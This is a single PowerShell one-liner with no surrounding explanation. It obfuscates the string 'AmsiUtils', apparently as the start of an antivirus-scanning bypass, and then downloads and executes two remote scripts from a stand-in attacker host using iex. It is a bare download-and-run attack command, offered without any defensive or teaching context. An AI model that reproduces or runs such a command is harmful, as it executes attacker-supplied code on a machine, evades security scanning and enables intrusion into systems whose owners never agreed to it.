$n = (new-object net.webClient);$am='Amsi'+'U'+'til'+'s';iex ($n).DownloadString('http://example.attacker.net:80/fail.ps1');iex ($n).DownloadString('http://example.attacker.net:80/nish.ps1')
